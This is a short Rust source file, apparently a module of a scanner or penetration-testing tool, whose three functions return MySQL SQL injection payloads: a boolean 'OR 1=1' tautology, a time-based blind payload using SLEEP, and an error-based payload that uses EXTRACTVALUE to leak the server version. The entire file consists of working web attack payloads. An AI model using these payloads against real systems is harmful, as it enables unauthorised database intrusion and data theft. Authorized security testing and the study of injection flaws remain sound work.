#![deny(unsafe_code)]
#[must_use]
pub fn mysql_boolean_true(comment: &str) -> String {
    format!("' OR 1=1{comment}")
}
#[must_use]
pub fn mysql_time_payload(secs: u64) -> String {
    format!("' AND SLEEP({secs}) -- -")
}
#[must_use]
pub fn mysql_error_payload() -> String {
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)) -- -".to_owned()
}
